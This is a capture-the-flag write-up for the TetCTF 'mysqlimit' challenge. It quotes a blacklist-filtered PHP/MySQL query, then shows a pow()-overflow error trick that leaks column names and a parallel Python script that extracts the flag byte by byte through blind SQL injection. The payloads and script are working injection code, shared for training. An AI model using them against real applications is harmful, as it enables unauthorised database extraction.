# mysqlimit
> Limit 'Em All!

Relevant source
```php
if !(preg_match('/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\<|\>|\=/is' , $_GET['id'])) {
    $id = mysqli_real_escape_string($conn, $_GET["id"]);
    $query = "select * from flag_here_hihi where id=".$id;
    $run_query = mysqli_query($conn,$query);

    if(!$run_query) {
        echo mysqli_error($conn);
    }
    else
    {    
        // I'm kidding, just the name of flag, not flag :(
        echo '<br>';
        $res = $run_query->fetch_array()[1];
        echo $res; 
    }
}
```

The code puts our input into a mysql query (only a single statement is allowed in these btw) and runs it, returning the 2nd column of the first row of input. The comment hints the flag is in another column.

We have SQL injection with a very strict filter. Although "exp" is filtered we can still use the bigint error message to get field names and semi-blind sql injection to exfiltrate flag bytes one by one.

The blind SQL injection technique I used was to extract each byte as a time with RIGHT and LEFT then use ASCII to convert it into a number. We then divide it by a guess such that if our guess is the same it will be equal to `1` and cause the overall query to select id=1.

ray will speed up the checking for us.

```python3
import requests
import ray

ray.init(include_dashboard=False)

base = "http://45.77.255.164/?id=ASCII(RIGHT(LEFT((SELECT t_fl4g_v3lue_su FROM flag_here_hihi LIMIT 1),%d),1))/%d"
s = requests.Session()

@ray.remote
def guess_char(pos, guess):
    res = s.get(base % (pos,guess))
    if 'handsome_flag' in res.text:
        return guess, True
    return guess, False

flag = "T"

while flag[-1] != "}":
    jobs = []
    for guess in range(0x20,0x7F):
        jobs.append(guess_char.remote(len(flag)+1, guess))
    while len(jobs) > 0:
        ready, jobs = ray.wait(jobs)
        res = ray.get(ready)
        print(res)
        fl = list(filter(lambda x: x[1] == True, res))
        if len(fl) > 0:
            break
    for o in jobs: ray.cancel(o,force=True)
    flag += chr(fl[0][0])
    print(flag)

print(flag)
```

```
http://45.77.255.164/?id=pow(~(SELECT%20id%20FROM%20(SELECT%20*%20FROM%20flag_here_hihi%20LIMIT%201)%20AS%20a),9999)
DOUBLE value is out of range in 'pow(~((select `a`.`id` from (select `flag_here_hoho`.`flag_here_hihi`.`id` AS `id`,`flag_here_hoho`.`flag_here_hihi`.`t_fl4g_name_su` AS `t_fl4g_name_su`,`flag_here_hoho`.`flag_here_hihi`.`t_fl4g_v3lue_su` AS `t_fl4g_v3lue_su` from `flag_here_hoho`.`flag_here_hihi` limit 1) `a`)),9999)'

> python3 mysqlimit.py
TetCTF{_W3LlLlLlll_Pl44yYyYyyYY_<3_vina_*100*28904961445554#}
```
